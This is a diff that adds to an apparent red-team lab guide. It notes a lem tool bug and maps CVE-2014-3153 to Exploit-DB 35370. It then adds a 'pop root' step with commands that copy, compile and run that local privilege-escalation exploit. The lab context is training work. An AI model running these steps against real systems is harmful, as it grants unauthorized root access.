@@ -98,4 +98,14 @@ git clone https://github.com/redteam-project/exploit-curation
 lem host assess --curation exploit-curation --kind stride --score 000009
 ```
 
+Note that there is currently a [bug](https://github.com/redteam-project/lem/issues/5) in lem that prevents the exploit that maps to CVE-2014-3153 from returning, but for purposes of this lab we know that it maps to EDBID 35370.
+
 16. Stage the exploit and pop root.
+
+```
+lem exploit copy --curation /tmp/exploit-curation --source exploit-database --id 35370 --destination /tmp/
+mv exploit-database-35370.txt exploit.c
+gcc -lpthread exploit.c -o exploit
+./exploit
+id -a
+```
